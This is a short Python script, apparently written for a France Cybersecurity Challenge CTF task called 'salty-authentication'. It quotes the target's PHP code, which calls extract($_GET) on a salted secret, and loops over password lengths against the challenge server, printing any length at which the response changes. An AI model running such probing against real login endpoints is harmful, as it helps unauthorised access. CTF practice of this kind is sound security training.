import requests, time

url = "https://salty-authentication.france-cybersecurity-challenge.fr/?password="
params_template = {"password": ""}

'''
$salt = bin2hex(random_bytes(12));  # 24 chars

extract($_GET);

$secret = gethostname() . $salt;
'''
for i in range(24, 40):
	params = params_template.copy()
	response = requests.get(url+'a'*i)
	time.sleep(0.2)
	if "highlight_file" not in response.text:
		print(i)
